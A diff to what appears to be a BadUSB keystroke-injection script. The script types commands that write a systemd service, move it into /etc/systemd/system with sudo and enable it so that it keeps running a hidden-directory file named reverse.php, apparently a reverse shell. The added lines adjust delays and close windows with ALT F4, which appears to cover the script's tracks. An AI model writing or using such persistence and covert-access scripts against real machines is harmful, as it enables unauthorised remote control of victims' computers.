@@ -24,6 +24,9 @@ DELAY 1000
 STRING echo -e "[Unit]\nDescription=My PHP Service\n\n[Service]\nExecStart=/usr/bin/php /home/sergio/.outlock/reverse.php\nRestart=always\nRestartSec=10\n\n[Install]\nWantedBy=multi-user.target" > outlock.service
 ENTER
 DELAY 500
+STRING cat outlock.service
+ENTER
+DELAY 1500
 STRING sudo mv outlock.service /etc/systemd/system/outlock.service
 ENTER
 DELAY 500
@@ -38,4 +41,7 @@ ENTER
 DELAY 500
 STRING sudo systemctl enable outlock.service
 ENTER
-DELAY 500
+DELAY 1000
+ALT F4
+DELAY 1000
+ALT F4
